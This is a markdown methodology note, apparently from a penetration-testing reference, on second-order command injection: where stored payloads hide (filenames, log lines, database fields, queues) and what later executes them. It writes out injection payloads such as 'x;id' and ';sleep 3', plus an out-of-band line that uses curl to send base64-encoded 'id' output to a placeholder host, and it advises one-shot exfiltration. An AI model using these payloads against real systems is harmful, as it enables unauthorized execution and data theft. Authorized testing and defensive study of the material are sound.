# Second-Order Command Injection — the stored payload that fires later

## The shape — inject once, execute later

```
input → stored (db, file, log, config, queue) → later read into a command
```

The injection's blast happens asynchronously — at a cron tick, an admin
action, a batch job, a report render. The request that delivers the
payload looks harmless; the trigger is elsewhere.

## Where payloads hide — the carrier fields

| Carrier | Trigger |
|---|---|
| DB column (`username`, `comment`, `description`) | admin report/query uses field in shell |
| Log line (UA/Referer/IP) | `grep`/`tail`/`awk` over logs |
| Filename | `mv`/`cp`/`convert`/`identify` on the name |
| Config field | template render into `nginx.conf`/`hosts`/crontab |
| Queue/job record | worker picks up → runs it |
| Comment/review/ticket | admin dashboard renders or exports |
| Uploaded file's content | a `grep $pattern` on it later |
| Email field | sendmail/mail on the field |

## The filename-carrier — `filename-injection.md`'s stored form

`mv "$tmp" "$dir/$filename"` — a filename `x;id` lands in the command
line at MOVE time — the "filename is the injection" shape. Similarly
`unzip`/`untar` entry names reaching post-extraction commands.

## The log-poisoning carrier — `log-poisoning.md`

UA/`Referer`/`XFF`/`path`/`username` reaching a log file a shell parses
later — `tail -n1 access.log | grep $x` where the log line contains
your injection.

## The cron/daemon trigger — the tick

- a cron `*/5 * * * *` processing a queue — the field you stored
- a systemd timer reading a config
- a watcher (`inotify`) on a dir — `skills/web-file-upload/references/queue-workers.md`

Detect the trigger from scheduling evidence: delay between action and
effect, periodic log entries, `*/N` in a status page.

## The reporting-trigger — admin-only action

- "generate report" reads stored fields into `wkhtmltopdf`/`convert`
- "export csv" concatenates fields into a command
- "email report" sendmail's the stored field (`mail` param injection)

## Detection — how to spot second-order cmdi

- input accepted, no immediate error, no output — AND
- a later-action exists (admin bot, report, cron, queue)
- fields that echo the stored value in a shell-like context later
- errors that surface the stored value inside a command line
  (`Error running: cat x;id` — the template leaked later)

## The "poll-and-watch" detection method

1. inject `;sleep 3` stored in a field
2. trigger the consumer (admin visit, report run, tick)
3. watch response times — delay = exec
4. OOB variant: `;curl http://YOU/$(id|base64 -w0)` stored — listener
   gets hit when consumed

`oob_listener.py serve --port 8000 --log hits.jsonl` — the hit time IS
the trigger time.

## The idempotent-trigger problem — can't re-trigger

If the consumer runs once per stored record — one shot — make the
payload self-contained (exfil in one run, not iterative boolean).

## Falsifiers

- nothing stored reaches a command — confirmed by code review or the
  consumer is a pure-display render
- the stored field is escaped before the command step

## Output to record

- the carrier field + the trigger + the verbatim trigger-time evidence
